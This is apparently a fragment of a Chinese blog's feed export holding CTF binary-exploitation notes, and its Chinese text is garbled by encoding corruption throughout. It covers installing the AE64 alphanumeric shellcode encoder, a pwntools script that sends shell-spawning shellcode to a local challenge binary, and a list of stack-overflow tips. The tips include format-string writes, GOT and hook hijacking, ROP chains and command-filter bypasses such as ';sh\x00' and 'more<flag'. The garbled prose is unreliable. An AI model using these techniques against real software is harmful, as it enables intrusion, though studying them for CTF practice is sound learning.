<p>mixedcaseï¼šæ•°å­—+å¤§å°å†™å­—æ¯ï¼›lowercaseï¼šæ•°å­—+å°å†™å­—æ¯ï¼›uppercaseï¼šæ•°å­—+å¤§å†™å­—æ¯ã€‚åªæœ‰x86æ‰æœ‰ä¸‰ç§é€‰é¡¹</p>
<p>å¯„å­˜å™¨åŒä¸Š</p>
<h3 id="AE64"><a href="#AE64" class="headerlink" title="AE64"></a>AE64</h3><p>AE64æ˜¯æ­ç”µçš„ä¸€ä½å¤§å¸ˆå‚…å†™çš„å·¥å…·ï¼Œä¸“ç”¨äºç”Ÿæˆ64ä½çš„aplha shellcode</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">git clone https://github.com/veritas501/ae64.git<br></code></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo python3 -m pip install keystone-engine<br>sudo python3 -m pip install z3-solver<br></code></pre></td></tr></table></figure>

<p>è¿˜éœ€è¦å®‰è£…ä»¥ä¸Šçš„ä¸¤ä¸ªä¾èµ–</p>
<p><img src="/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/56" alt="image-20211003154639933"></p>
<p>å¦‚æœå‡ºç°ä¸Šè¿°æƒ…å†µï¼Œæ‰§è¡Œä»¥ä¸‹çš„å‘½ä»¤</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cd ae64<br>sudo cp ./ae64.py /lib/python3/dist-packages/ae64.py<br></code></pre></td></tr></table></figure>

<p>æ­¤å¤–AE64æ˜¯pythonå†™çš„ï¼Œå¯ä»¥ç›´æ¥åœ¨pythonä¸­è°ƒç”¨ï¼Œä»¥ä¸‹æ˜¯ä¾‹å­</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ae64 <span class="hljs-keyword">import</span> AE64<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>p = process(<span class="hljs-string">&#x27;./example1&#x27;</span>)<br><br>shellcode = AE64().encode(asm(shellcraft.sh()),<span class="hljs-string">&#x27;r13&#x27;</span>)<br><br>p.sendline(shellcode)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>



]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>æ ˆæº¢å‡º--è§£é¢˜äºŒä¸‰äº‹</title>
    <url>/2020/11/22/2020-11-22-%E6%A0%88%E6%BA%A2%E5%87%BA-%E8%A7%A3%E9%A2%98%E4%BA%8C%E4%B8%89%E4%BA%8B/</url>
    <content><![CDATA[<p>1ã€åœ¨pythonä¸­å¦‚ \x62ï¼Œè¡¨ç¤ºä¸€ä¸ªå ä¸€ä¸ªå­—èŠ‚çš„åå…­è¿›åˆ¶æ•°</p>
<p>2ã€å¤§å¤šæ•°ç¨‹åºæ˜¯å°ç«¯é¡ºåºï¼Œå°±æ˜¯è¯´è¾“å…¥ä¸€ä¸ªæ•°æ®ï¼Œå¦‚æœæ˜¯åˆ†å¼€è¾“å…¥æ—¶ï¼ˆæ¯”å¦‚è¦ä¸€ä¸ªå­—èŠ‚ï¼Œä¸€ä¸ªå­—èŠ‚çš„æŒ‰å­—èŠ‚åˆ†å¼€è¿›è¡Œè¾“å…¥åå…­è¿›åˆ¶çš„æ•°ï¼Œè€Œä»–ä»¬æœ¬èº«åˆèµ·æ¥æ˜¯ä¸€ä¸ªå…·ä½“çš„æ•°ï¼Œé‚£ä¹ˆæ­¤æ—¶è¾“å…¥è¿›å»ï¼Œå°±éœ€è¦æŠŠå°çš„å€¼æ”¾åœ¨å‰é¢å…ˆå†™ï¼Œå¤§çš„å€¼æ”¾åé¢ï¼‰ï¼›è€Œå¤§ç«¯é¡ºåºåˆ™æ˜¯å¤§çš„å€¼å†™å‰é¢ï¼Œä¸å¹³å¸¸ä¸€æ ·çš„é¡ºåºå†™</p>
<p>å› ä¸ºå°ç«¯é¡ºåºï¼Œå°±æ˜¯éœ€è¦ä»ä½åœ°å€å¾€é«˜åœ°å€å¡«å……æ•°æ®ï¼Œæ‰€ä»¥å…ˆè¾“å…¥çš„æ˜¯ä¼šæ”¾åœ¨ä½åœ°å€çš„æ•°ï¼Œåè¾“å…¥çš„æ‰æ˜¯é«˜åœ°å€çš„æ•°</p>
<p>åœ¨Linuxä¸­LSBæ–‡ä»¶ä¸ºå°ç«¯é¡ºåºï¼ŒMSBä¸ºå¤§ç«¯é¡ºåºï¼Œ</p>
<p>3ã€IDA</p>
<p>ï¼ˆ1ï¼‰F5è¿›è¡Œåæ±‡ç¼–</p>
<p>ï¼ˆ2ï¼‰ida ä¸­æŒ‰ä¸‹F12+SHIFTï¼Œå¯ä»¥æŸ¥çœ‹string windowsï¼ŒæŸ¥çœ‹ä¸€äº›å…³é”®å­—ç¬¦ä¸²ä¿¡æ¯</p>
<p>ï¼ˆ3ï¼‰Alt+bå¯ä»¥è¿›è¡Œæœç´¢å­—ç¬¦ä¸²</p>
<p>ï¼ˆ4ï¼‰åœ¨åæ±‡ç¼–çª—å£ä¸­ï¼Œç‚¹å‡»å‡½æ•°æŒ‰ä¸‹Xï¼Œå¯ä»¥æŸ¥çœ‹äº¤å‰å¼•ç”¨</p>
<p>ï¼ˆ5ï¼‰TABé”®å¯ä»¥åˆ‡æ¢æ±‡ç¼–ä¸ä¼ªä»£ç </p>
<p>ï¼ˆ6ï¼‰**;** é”®å¯ä»¥ä¸ºå½“å‰æŒ‡ä»¤æ·»åŠ å…¨æ–‡äº¤å‰å¼•ç”¨çš„æ³¨é‡Š </p>
<p>ï¼ˆ7ï¼‰nå¯ä»¥å®šä¹‰æˆ–ä¿®æ”¹åç§°ï¼Œé€šå¸¸ç”¨æ¥æ ‡æ³¨å‡½æ•°å </p>
<p>ï¼ˆ8ï¼‰gå¯ä»¥è·³è½¬åˆ°ä»»æ„åœ°å€ </p>
<p>ï¼ˆ9ï¼‰Escå¯ä»¥è¿”å›åˆ°è·³è½¬å‰çš„ä½ç½® </p>
<p>ï¼ˆ10ï¼‰Då¯ä»¥åˆ†åˆ«æŒ‰å­—èŠ‚ã€å­—ã€åŒå­—æ˜¾ç¤ºæ•°æ® </p>
<p>ï¼ˆ11ï¼‰Aå¯ä»¥æŒ‰ ASCII æ˜¾ç¤ºæ•°æ® </p>
<p>ï¼ˆ12ï¼‰/ä¸ºä¼ªCä»£ç æ·»åŠ æ³¨é‡Š</p>
<p>idaçš„ä¼ªä»£ç å«ä¹‰ï¼š</p>
<p>sub_ æŒ‡ä»¤å’Œå­å‡½æ•°èµ·ç‚¹</p>
<p>locret_ è¿”å›æŒ‡ä»¤ </p>
<p>loc_ æŒ‡ä»¤</p>
<p>off_ æ•°æ®ï¼ŒåŒ…å«åç§»é‡</p>
<p>seg_ æ•°æ®ï¼ŒåŒ…å«æ®µåœ°å€å€¼</p>
<p>asc_ æ•°æ®ï¼ŒASCIIå­—ç¬¦ä¸²</p>
<p>byte_ æ•°æ®ï¼Œå­—èŠ‚ï¼ˆæˆ–å­—èŠ‚æ•°ç»„ï¼‰</p>
<p>word_ æ•°æ®ï¼Œ16ä½æ•°æ®ï¼ˆæˆ–å­—æ•°ç»„ï¼‰</p>
<p>dword_ æ•°æ®ï¼Œ32ä½æ•°æ®ï¼ˆæˆ–åŒå­—æ•°ç»„ï¼‰</p>
<p>qword_ æ•°æ®ï¼Œ64ä½æ•°æ®ï¼ˆæˆ–4å­—æ•°ç»„ï¼‰</p>
<p>flt_ æµ®ç‚¹æ•°æ®ï¼Œ32ä½ï¼ˆæˆ–æµ®ç‚¹æ•°ç»„ï¼‰</p>
<p>dbl_ æµ®ç‚¹æ•°ï¼Œ64ä½ï¼ˆæˆ–åŒç²¾åº¦æ•°ç»„ï¼‰</p>
<p>tbyte_ æµ®ç‚¹æ•°ï¼Œ80ä½ï¼ˆæˆ–æ‰©å±•ç²¾åº¦æµ®ç‚¹æ•°ï¼‰</p>
<p>stru_ ç»“æ„ä½“(æˆ–ç»“æ„ä½“æ•°ç»„)</p>
<p>algn_ å¯¹é½æŒ‡ç¤º</p>
<p>unk_ æœªå¤„ç†å­—èŠ‚</p>
<p>4ã€åˆ©ç”¨å­—ç¬¦ä¸²ç¨‹åºè¾“å…¥æº¢å‡ºæ•°æ®é€ æˆæ ˆæº¢å‡ºçš„æ—¶å€™ä¸è¦åŒ…å«\x00ï¼ˆä¹Ÿå°±æ˜¯æ‰€è°“çš„ç©ºå­—ç¬¦â€™\0â€™ï¼‰ï¼Œå¦åˆ™å‘ç¨‹åºä¼ å…¥æº¢å‡ºæ•°æ®æ—¶ä¼šé€ æˆæˆªæ–­</p>
<p>5ã€é‡åˆ°ä¸ç¡®å®šçš„åœ°å€æ—¶è€Œæœ€ååœ°å€çš„æœ«ç«¯æ˜¯æˆ‘ä»¬éœ€è¦åˆ°çš„shellçš„èµ·å§‹åœ°å€ï¼Œå¯ä»¥å¡«å…¥\x90ï¼Œå¯¹åº”çš„æœºå™¨ç æŒ‡ä»¤æ˜¯NOP(No Operation)ï¼Œè®©CPUä»€ä¹ˆéƒ½ä¸åšï¼Œè·³è½¬åˆ°ä¸‹ä¸€æ¡å‘½ä»¤ï¼Œä½†æ˜¯è¿™ä¸ªåº”ç”¨çš„å‰ææ˜¯è¯¥å¤„ä»£ç å…·æœ‰å¯æ‰§è¡Œæ€§</p>
<p>6ã€åœ¨ä¸€èµ·å®šä¹‰çš„ä¸¤ä¸ªå…¨å±€å˜é‡ï¼Œåœ¨å†…å­˜çš„ä¸­ä½ç½®æ˜¯ç›¸é‚»çš„ã€‚å¦‚æœä¸€ä¸ªå…¨å±€å˜é‡è¢«ç ´åäº†ï¼Œä¸å¦¨å…ˆæŸ¥æŸ¥å…¶å‰åç›¸å…³å˜é‡çš„è®¿é—®ä»£ç ï¼Œçœ‹çœ‹æ˜¯å¦å­˜åœ¨è¶Šç•Œè®¿é—®çš„å¯èƒ½ã€‚</p>
<p>7ã€æœ‰ä¸€ä¸ªæœ‰æ„æ€çš„ä¸œè¥¿ï¼šåœ¨æœ‰çš„pwné¢˜ç›®ä¸­ï¼Œæˆ‘å¯ä»¥å¾ˆæ­£å¸¸çš„ä½¿ç”¨recvuntil()æˆ–è€…sendlineafter()å»æ¥æ”¶å­—ç¬¦ä¸²ï¼Œç„¶è€Œæœ‰çš„å´ä¸è¡Œï¼›æœ‰çš„é¢˜ç›®å¯ä»¥ä¸ç”¨æ¥æ”¶å­—ç¬¦ä¸²ç›´æ¥è¾“å…¥payloadï¼ˆä¸€å¼€å§‹è®¤ä¸ºæ˜¯å› ä¸ºç¨‹åºæ˜¯åœ¨è‡ªå·±è¿è¡Œï¼Œåˆšå¥½æº¢å‡ºç‚¹åˆåœ¨ç¬¬ä¸€æ¬¡è¾“å…¥çš„åœ°æ–¹ï¼Œæ‰€ä»¥å¯ä»¥ï¼‰ï¼Œç„¶è€Œå´ç¢°åˆ°æœ‰äº›å´è¦æˆ‘æ¥æ”¶ä¿¡æ¯æ‰å¯ä»¥è¿›è¡Œpayloadçš„è¾“å…¥</p>
<p>å›å¤ï¼šæœ€å¥½æ˜¯è¿›è¡Œäº¤äº’ï¼Œä¹‹å‰å¯èƒ½æ˜¯å› ä¸ºç¯å¢ƒæœ‰äº›é—®é¢˜</p>
<p>8ã€é‡åˆ°ä¸€ä¸ªå¯¹é½çš„é—®é¢˜ï¼šå…³äºä½¿ç”¨systemå‡½æ•°è¿›è¡Œè·³è½¬å‡ºç°æŠ¥é”™çš„åŸå› </p>
<p>å›å¤ï¼šsystemè·å¾—shellï¼Œæ˜¯è¦æ±‚æœ‰æ ˆå¯¹é½çš„</p>
<p>9ã€åŠ«æŒæ ˆå¸§åˆ°.bssæ®µä¸Šæ—¶ï¼Œè¦æ³¨æ„ä¸€ä¸‹æ˜¯å¦å¯èƒ½ä¼šå°†.got.pltè¡¨è¦†ç›–ï¼Œå¯¼è‡´ç¨‹åºæ— æ³•æ­£å¸¸æ‰§è¡Œ</p>
<p>10ã€æ‰¿æ¥ç¬¬4ç‚¹å§ï¼Œæˆ‘ä»¬é¿å…è¾“å…¥\x00å¯¼è‡´ç¨‹åºæˆªæ–­ï¼ŒåŒæ—¶ä¹Ÿè¦æ³¨æ„ç¨‹åºæ˜¯å¦è‡ªèº«æœ‰ç€\x00ï¼Œå¯¼è‡´äº†æˆªæ–­</p>
<p>11ã€é‡åˆ°strcatã€strcpyã€strcmpã€strlenç­‰å‡½æ•°çš„é˜»ç¢æ—¶ï¼Œç”±äºè¿™äº›å‡½æ•°é‡åˆ°â€™\0â€™å°†ä¼šåœæ­¢ï¼Œé‚£ä¹ˆåªè¦å°†å…¶ä¸­çš„æŸä¸ªå˜é‡çš„ç¬¬ä¸€ä¸ªå­—ç¬¦è®¾ä¸ºâ€™\0â€™å³å¯å¿«é€Ÿç®€å•çš„ç»•è¿‡è¿™äº›å‡½æ•°</p>
<p>12ã€å½“ç”¨putså‡½æ•°æ³„éœ²gotè¡¨çš„åœ°å€ï¼Œä½¿ç”¨u64è§£åŒ…æ—¶ï¼Œç”±äºu64è§£åŒ…çš„æ¡ä»¶æ˜¯éœ€è¦å­—ç¬¦ä¸²çš„é•¿åº¦ä¸º8ä¸ªå­—èŠ‚ï¼Œè€Œåœ°å€çš„é•¿åº¦é¡¶å¤š6ä¸ªå­—èŠ‚é‚£ä¹ˆé•¿ï¼ˆé«˜åœ°å€å¡«å……0ï¼Œä½†æ˜¯æˆ‘ä»¬å¹¶ä¸èƒ½æ¥æ”¶åˆ°ï¼‰ï¼Œæ­¤æ—¶å°±éœ€è¦ä½¿ç”¨è¿™æ ·çš„å½¢å¼è¿›è¡Œæ¥æ”¶ï¼š<strong>u64(p.recv(6).ljust(8,â€™\0â€™))</strong>  ï¼ˆâ€™\0â€™å†™æˆâ€™\x00â€™ä¹Ÿè¡Œï¼Œæ¯•ç«Ÿåœ¨å†…å­˜ä¸­å­˜å‚¨æƒ…å†µæ˜¯ä¸€æ ·çš„è¿˜æœ‰**u64(p.recvuntil(â€˜\x7fâ€™).ljust(8,â€™\x00â€™))**ï¼‰</p>
<p>13ã€ä¸€ä¸ªå¤§å¤šæ•°äººåº”è¯¥éƒ½æœ‰é”™è¯¯çš„è®¤çŸ¥ï¼šè®¤ä¸ºæº¢å‡ºåªè¦åˆ°å¦‚getså‡½æ•°å°±èƒ½å®ç°æº¢å‡ºäº†ï¼Œæ‰€ä»¥ä¸‹é¢çš„ä»£ç å°±ä¸ç”¨çœ‹ï¼Œè¿™æ˜¯ç»å¯¹é”™è¯¯çš„ï¼é¦–å…ˆï¼Œæˆ‘ä»¬é€šè¿‡æ ˆæº¢å‡ºæ”¹å˜çš„åªæ˜¯è¿”å›åœ°å€çš„å†…å®¹ï¼Œæƒ³è¦åˆ°è¾¾è¿”å›åœ°å€ï¼Œæ•´ä¸ªçš„å‡½æ•°æ‰§è¡Œæµå¿…é¡»è¿›è¡Œå®Œï¼Œæ‰ä¼šå‘ç”Ÿé€€æ ˆï¼Œä»è€Œåˆ©ç”¨è¿”å›åœ°å€ï¼Œæ‰€ä»¥ä¸‹æ–¹çš„ä»£ç ä¹Ÿè¦å¤„ç†</p>
<p>14ã€æ‰§è¡Œstrcmpã€strncmpã€strcasecmpçš„æ—¶å€™ï¼Œrdxä¼šè¢«è®¾ç½®ä¸ºå°†è¦è¢«æ¯”è¾ƒçš„å­—ç¬¦ä¸²çš„é•¿åº¦</p>
<p>15ã€systemçš„å‚æ•°ä¸ä¸€å®šæ˜¯è¦/bin/shæ‰å¯ä»¥ï¼Œåªæœ‰shä¹Ÿæ˜¯å¯ä»¥çš„ã€‚è€Œä¸”shå¯ä»¥ä»fflush()è¿™ä¸ªå‡½æ•°ä¸­è·å–ï¼Œç›´æ¥æŸ¥æ‰¾idaæˆ–è€…ROPgadget â€“binary æ–‡ä»¶å â€“string â€˜shâ€™æŸ¥è¯¢ï¼ˆä¸ä¸€å®šéƒ½èƒ½æˆåŠŸï¼‰</p>
<p>æœ‰æ—¶å€™systemå‚æ•°ä¼šå‡ºç°æˆªæ–­é—®é¢˜ï¼Œå†™æˆ<code>;sh\x00</code>ï¼Œ<code>||sh</code>ï¼Œ<code>&amp;&amp;sh</code></p>
<p>16ã€å½“è¿œç¨‹dockerè¿‡æ»¤ç©ºæ ¼å’Œcatæ—¶ï¼Œå°†æ— æ³•ä½¿ç”¨cat flagè·å–åˆ°flagï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥ç”¨<strong>more&lt;flagæˆ–è€…base64&lt;flag</strong>è·å–flagï¼Œå…¶ä¸­çš„&lt;å¯ä»¥ä»£æ›¿ç©ºæ ¼çš„åŠŸèƒ½ï¼Œç¬¬ä¸€ä¸ª<strong>more&lt;flag</strong> ä¸catä¸€æ ·éƒ½æ˜¯è¾“å‡ºæ–‡ä»¶å†…å®¹ï¼Œè€Œbase64æ˜¯æŠŠflagçš„å†…å®¹è½¬æ¢æˆbase64ç¼–ç </p>
<p>&lt;ã€&lt;&gt;å¯ä»¥ä»£æ›¿ç©ºæ ¼</p>
<p>17ã€64ä½çš„æ–‡ä»¶æœ‰æ—¶å€™ä¸ä¸€å®šä¼šå­˜åœ¨rbpçš„è°ƒç”¨ï¼Œä¸å­˜åœ¨leaveæŒ‡ä»¤ï¼Œè¿™æ—¶å€™æˆ‘ä»¬åªéœ€è¦å»å…³æ³¨rspçš„ä½ç½®å³å¯ï¼Œå› ä¸ºretæŒ‡ä»¤ä»£è¡¨ç€pop ripï¼ŒæŠŠæ ˆé¡¶çš„å†…å®¹å¼¹å‡ºç»™ripï¼Œæ‰€ä»¥é”å®šrspçš„ä½ç½®ï¼Œå°±å¯ä»¥åŠ«æŒrip</p>
<p>18ã€æœ‰æ—¶å€™åœ¨æˆ‘ä»¬è¾“å…¥æ—¶ï¼Œæ— æ³•é€šè¿‡recvuntilå»å¡åˆ°è¾“å…¥çš„ç‚¹ï¼Œå¯ä»¥ä½¿ç”¨sleep()å‡½æ•°ï¼Œè®©çº¿ç¨‹ä¼‘çœ ï¼Œè®©å¯¹é¢çš„ç¨‹åºè·‘åˆ°æˆ‘ä»¬è¦åˆ°ç‚¹ï¼Œå†è¿›è¡Œè¾“å…¥ï¼Œæ–¹å¯åˆ©ç”¨æˆåŠŸï¼ˆä¸ªäººçŒœæµ‹ï¼‰</p>
<p>19ã€64ä½ä¸‹çš„linuxçš„ç³»ç»Ÿè°ƒç”¨å·ï¼ˆä½¿ç”¨syscallè°ƒç”¨ï¼Œè°ƒç”¨å·æ˜¯ä¿å­˜åˆ°raxä¸­,å‡½æ•°ä¼ å‚ä¾æ¬¡å­˜å…¥RDI,RSI,RDX,RCX,R8,R9ï¼‰</p>
<p><strong>0(0x0) sys_read</strong></p>
<p><strong>1(0x1) sys_write</strong></p>
<p><strong>2(0x2)sys_open</strong></p>
<p><strong>3(0x3)sys_close</strong></p>
<p><strong>9(0x9)sys_mmap</strong></p>
<p><strong>15(0xF) sys_rt_sigreturn</strong></p>
<p><strong>37(0x25)sys_alarm</strong></p>
<p><strong>59(0x3B) sys_execve</strong></p>
<p><strong>60(0x3C)sys_exit</strong></p>
<p><strong>62(0x3E)sys_kill</strong></p>
<p>32ä½ä¸‹linuxç³»ç»Ÿè°ƒç”¨å·ï¼ˆä½¿ç”¨int 80hï¼Œè°ƒç”¨å·ä¿å­˜åœ¨eaxä¸­ï¼Œæ‰§è¡Œå®Œå‡½æ•°çš„è¿”å›å€¼ä¹Ÿä¿å­˜åœ¨eaxé‡Œé¢ï¼‰ï¼Œå‡½æ•°å…¶ä»–å‚æ•°ä¾æ¬¡å­˜å…¥ebxï¼Œecxï¼Œedxä¸­</p>
<p><strong>1(0x1)sys_exit</strong></p>
<p><strong>3(0x3)sys_read</strong></p>
<p><strong>4(0x4)sys_write</strong></p>
<p><strong>5(0x5)sys_open(æ–‡ä»¶å,0,0)</strong></p>
<p><strong>11(0xB) sys_execve</strong> </p>
<p>20ã€ä½¿ç”¨<strong>execve</strong>è·å–shellæ—¶ï¼Œå…¶å‚æ•°è¦è®¾ç½®ä¸º<code>execve(&quot;/bin/sh&quot;,0,0)</code></p>
<p>21ã€åŠ«æŒripæ—¶ï¼Œå¦‚æœè§‰å¾—åœ¨idaä¸­çš„æ ˆæŸ¥çœ‹è¦†ç›–åç§»é‡æ˜¯å¯¹çš„ï¼Œå´æ²¡èƒ½è·å–shellæ—¶ï¼Œå»çœ‹çœ‹æ±‡ç¼–ä»£ç ï¼Œå¯èƒ½è¿™æ—¶å€™å‡ºé¢˜äººæ•…æ„è®¾ç½®äº†è¿”å›ä»£ç ä¸æ˜¯å¹³å¸¸çš„ leave  retè¿™ä¸¤ä¸ªï¼Œè¢«ä¿®æ”¹ä¸ºå…¶ä»–çš„ä»£ç äº†ï¼Œå¯¼è‡´é€€æ ˆæ—¶å€™rspæŒ‡å‘åœ°æ–¹çš„ä¸æ˜¯åœ¨rbpçš„ä¸‹é¢ï¼Œè¿™æ—¶å€™æˆ‘ä»¬è¦å»gdbé‡Œé¢ä¸‹æ–­ç‚¹åœ¨è¿”å›çš„æŒ‡ä»¤å‰ï¼ŒæŸ¥çœ‹rbpå…·ä½“æŒ‡å‘çš„åœ°æ–¹</p>
<p>22ã€<strong>gdb æ–‡ä»¶å core</strong>å¯ä»¥è°ƒè¯•ç¨‹åºä¸­æ–­è€Œç”Ÿæˆçš„æ ¸å¿ƒè½¬å‚¨æ–‡ä»¶ï¼Œè¿›è¡Œæ·±å…¥æŸ¥çœ‹ä¸­æ–­åŸå›  </p>
<p>23ã€å½“é¢˜ç›®å·²ç»™å‡ºlibcæ—¶ï¼Œå¯ä»¥ç›´æ¥ç”¨libcæ˜¾ç¤ºå‡ºå‡½æ•°åœ¨å…¶å†…çš„åç§»åœ°å€ï¼Œå‘½ä»¤æ ¼å¼å¦‚ä¸‹ï¼šï¼ˆä¹Ÿå¯ä»¥ç›´æ¥è°ƒç”¨libcæ–‡ä»¶ï¼Œlibc = ELF(â€œ./æ–‡ä»¶åâ€)ï¼‰</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">objdump -T ./libc-2.23.so | grep system #æ˜¾ç¤ºsystemçš„libcåœ°å€<br></code></pre></td></tr></table></figure>

<p><img src="/2020/11/22/2020-11-22-%E6%A0%88%E6%BA%A2%E5%87%BA-%E8%A7%A3%E9%A2%98%E4%BA%8C%E4%B8%89%E4%BA%8B/QQ%E5%9B%BE%E7%89%8720210510214657.png"></p>
<p>24ã€é™æ€é“¾æ¥é¢˜ç›®å¤šåŠè€ƒè™‘ret2syscallï¼Œæˆ–è€…çœ‹æœ‰æ²¡æœ‰mprotectå‡½æ•°ï¼Œä¿®æ”¹æ®µçš„æ‰§è¡Œæƒé™ï¼Œæ³¨å…¥shellcode</p>
<p>25ã€libcä¸­environå­˜å‚¨äº†æ ˆä¸Šç¯å¢ƒå˜é‡çš„ç‰¹æ€§ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ•ˆæ¥æ³„éœ²å‡ºæ ˆä¸Šçš„åœ°å€ï¼Œå†™ä¸ºè¿™æ ·libc.sym[â€œenvironâ€]</p>
<p>26ã€scanfè¯»å–è¿‡é•¿çš„è¾“å…¥æ—¶ä¼šä½¿ç”¨malloc_hookåˆ†é…chunkï¼Œä¹Ÿå°±æ˜¯å¯ä»¥å€Ÿæ­¤å¦‚æœèƒ½ä¿®æ”¹__malloc_hookä¸ºone_gadgetçš„è¯ï¼Œå°±èƒ½getshell</p>
<p>27ã€gotè¡¨åŠ«æŒï¼šå¸¸è§åŠ«æŒput(buf)ã€free(buf)ã€atoi(buf)ã€atol(buf)ã€strlen(buf)</p>
<p>28ã€å½“scanfçš„å‚æ•°ä¸æ˜¯%sæ—¶å€™ï¼Œæ˜¯uï¼Œdç­‰æ•°å­—ï¼Œè¾“å…¥æ•°å­—æ˜¯ä½¿ç”¨str()å³å¯ï¼Œä¸ç”¨p64()ã€‚</p>
<p>å› ä¸ºè¾“å…¥æ•°å­—æ˜¯å°±æ˜¯ä½¿ç”¨æ•°å­—è¾“å…¥ï¼Œå¦‚æœä½¿ç”¨äº†p64()å°†ä¼šå˜æˆå­—ç¬¦æ•°å­—</p>
<p>29ã€ä½¿ç”¨execv(â€œ/bin/shâ€,0)getshelléœ€è¦ä¸¤ä¸ªå‚æ•°,æ¯”execveå°‘ä¸€ä¸ª</p>
<p>å¦å¤–ï¼š2.29ä¹‹åçš„libcç›´æ¥è°ƒç”¨systemä¼šå‡ºé—®é¢˜ï¼Œä½†æ˜¯åŠ«æŒ__free_hookä¸ºsystemæ²¡é—®é¢˜</p>
<p>30ã€ç¢°åˆ°é™æ€ç¼–è¯‘çš„é¢˜ç›®æ—¶ï¼Œæœ‰ä¸¤ç§æ–¹æ³•ï¼š</p>
<ul>
<li><p>ä½¿ç”¨ROPgadgetå†…ç½®çš„åŠŸèƒ½ï¼Œå¯ä»¥è‡ªåŠ¨ç”Ÿæˆropé“¾ï¼Œè°ƒç”¨ç³»ç»Ÿå‡½æ•°getshellï¼Œå‘½ä»¤ï¼š</p>
<p><code>ROPgadget --binary æ–‡ä»¶å --ropchain</code></p>
</li>
<li><p>ä½¿ç”¨mprotectå‡½æ•°ä¿®æ”¹.bssæ®µæ‰§è¡Œæƒé™ï¼ŒæŠŠshellcodeå†™å…¥.bssæ®µä¸­æ‰§è¡Œè€Œgetshell</p>
</li>
</ul>
<p>31ã€æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼šå½“è¦å¾€æŸä¸ªåœ°å€ä¸Šå†™å…¥åœ°å€æ—¶ï¼Œæ ¼å¼ä¸ºï¼šç›®æ ‡addr + â€˜%â€™ + str(addr - å·²å†™çš„é•¿åº¦) + â€œc%a(aæ˜¯åç§»é‡)$hnâ€ è¿™è¾¹ä¸€èˆ¬ä½¿ç”¨hnå†™ä¸¤ä¸ªå­—èŠ‚ï¼Œæˆ–è€…hhnå†™ä¸€ä¸ªå­—èŠ‚ï¼Œè¿™æ ·ä¸å®¹æ˜“é€ æˆtimeoutï¼Œå½“ç„¶å‰ææ˜¯æ ¼å¼åŒ–æ¼æ´ç»™çš„é•¿åº¦å¤Ÿé•¿</p>
<p>å·²å†™é•¿åº¦ï¼šprintfæ‰“å°å‡ºæ¥çš„å­—ç¬¦é•¿åº¦ï¼Œåœ°å€æ•°å€¼å¤§çš„å†™åé¢ï¼ˆå°±èƒ½ç›´æ¥å‡å»å‰é¢å·²ç»å†™çš„åç§»é‡ï¼‰</p>
<p>64ä½ï¼Œå› ä¸ºåœ°å€å¿…å®šå«æœ‰â€™\x00â€™ï¼Œä¼šäº§ç”Ÿæˆªæ–­ï¼Œæ‰€ä»¥å¾€ç›®æ ‡åœ°å€å†™å…¥å€¼ï¼Œè¦æŠŠåœ°å€æ”¾åœ¨æœ€åé¢ï¼Œä¸ç„¶æ‰“å°çš„å­—ç¬¦è¢«æˆªæ–­ï¼Œnå°±æ²¡åŠæ³•å‘ç”Ÿä½œç”¨</p>
<p>32ã€å¯¹äºåŠ«æŒripçš„ç†è§£ï¼šé¦–å…ˆæˆ‘ä»¬ä¼ é€’ç»™ripçš„æ˜¯æŸä¸ªåœ°å€ï¼Œå…¶æ¬¡è¿™ä¸ªåœ°å€æŒ‡å‘çš„æ˜¯ä¸€æ®µæœ‰å¯æ‰§è¡Œæƒé™çš„åœ°å€ï¼Œæœ€åè¿™ä¸ªåœ°å€ä¸Šå­˜åœ¨ç€æŒ‡ä»¤ï¼ˆæœºå™¨ç ï¼‰ropå°±æ˜¯è¿˜éœ€è¦retæ¥è¡”æ¥è¿›è¡Œä¸æ–­åœ°æ›´æ¢ripçš„å€¼</p>
<p>33ã€linuxä¸­ï¼Œç¨‹åºåœ¨åŠ è½½çš„æ—¶å€™ï¼Œä¼šä¾æ¬¡è°ƒç”¨<code>init.array</code>æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼›åœ¨ç»“æŸçš„æ—¶å€™ï¼Œä¾æ¬¡è°ƒç”¨<code>fini.array</code>ä¸­çš„æ¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆã€‚ä¸€èˆ¬ç”¨åœ¨å½“ç¨‹åºå‡ºç°æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä½†æ˜¯è‡³å°‘éœ€è¦å†™ä¸¤æ¬¡æ‰èƒ½å®Œæˆæ”»å‡»ã€‚</p>
<ul>
<li>å¯ä»¥è€ƒè™‘æ”¹å†™<code>fini.array</code>ä¸­çš„å‡½æ•°æŒ‡é’ˆä¸º<code>main</code>å‡½æ•°åœ°å€ï¼Œå¯ä»¥å†æ‰§è¡Œä¸€æ¬¡<code>main</code>å‡½æ•°ã€‚ï¼ˆæˆ–è€…åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åé¢å­˜åœ¨æœ‰å…¶ä»–å‡½æ•°çš„è°ƒç”¨ï¼Œä¹Ÿå¯ä»¥è€ƒè™‘ä¿®æ”¹è¿™ä¸ªå‡½æ•°çš„gotè¡¨ï¼‰</li>
<li>ä¸€èˆ¬æ¥è¯´ï¼Œè¿™ä¸ªæ•°ç»„çš„é•¿åº¦ä¸º1ï¼Œä¹Ÿå°±æ˜¯è¯´åªèƒ½å†™ä¸€ä¸ªåœ°å€</li>
</ul>
